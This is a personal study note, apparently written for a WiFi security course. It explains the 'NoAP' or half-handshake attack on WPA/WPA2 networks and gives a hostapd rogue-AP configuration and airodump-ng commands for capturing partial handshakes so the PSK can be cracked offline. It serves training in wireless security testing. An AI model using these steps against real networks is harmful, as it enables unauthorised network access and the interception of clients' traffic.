# NoAP
The NoAP or "half-handshake" attack is used to *trick clients into connecting to a malicious device* (by making them believe they're connecting to a legit AP). The attack is based on impersonating an AP and creating a network *based on client probes*.

The NoAP attack is useful in [WPA/WPA2](../../networking/wifi/WPA-WPA2.md) networks where you *don't know the `PSK`*. During the standard [WPA authentication](../../networking/wifi/WPA-WPA2.md#Authentication), the `PSK` is integrated in the first two handshake packets. If you can capture these packets, then you can perform brute force attacks to crack the `PSK` from the handshake.
## Attack
The simplest way to carry this out is to create a fake AP using `hostapd`. The fake AP should have *the same name as your target AP* and be configured with a random password. Once the AP is created, you can monitor its channel using `airodump-ng` and wait for clients to connect.

Just like in the [karma attack](../OPN-attacks/karma-attack.md) in OPN networks, we can also target clients who are probing for APs in their PNL (Preferred Network List).
### Steps
#### 1. Create the `hostapd` configuration file
First, create configuration file for `hostapd`:
```bash
interface=<INTERFACE>
driver=nl80211
hw_mode=g
channel=6
ssid=<ESSID>
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP CCMP
wpa_passphrase=12345678
```
- `interface`: set to the wireless interface you want to use
- `ssid`: set to the SSID you want to use (should match your *target AP's SSID*)
- `channel`: set to the channel you want to use
#### 2. Start monitoring the network
Before creating the AP with the new conf file, start monitoring the network with `airodump-ng`:
```bash
sudo airodump-ng wlan0mon -c 6 -w ~/wifi/capturec6
```
#### 3. Bring up the AP
Once you're monitoring, you can bring up your rogue AP with:
```bash
hostapd rogue.conf
```
#### 4. Capture a handshake
As soon as we capture a handshake we want to *stop the rogue AP* since other clients may try to connect to it. Once its stopped, we can crack the handshake using the same methods described in the [handshake-attack](handshake-attack.md) notes:
![Attack Steps](handshake-attack.md#Attack%20Steps)


> [!Resources]
> - [Wifi Challenge Academy](https://academy.wifichallenge.com/courses/take/certified-wifichallenge-professional-cwp/texts/57442980-introduction)
> - My [own notes](https://github.com/trshpuppy/obsidian-notes) linked throughout the text.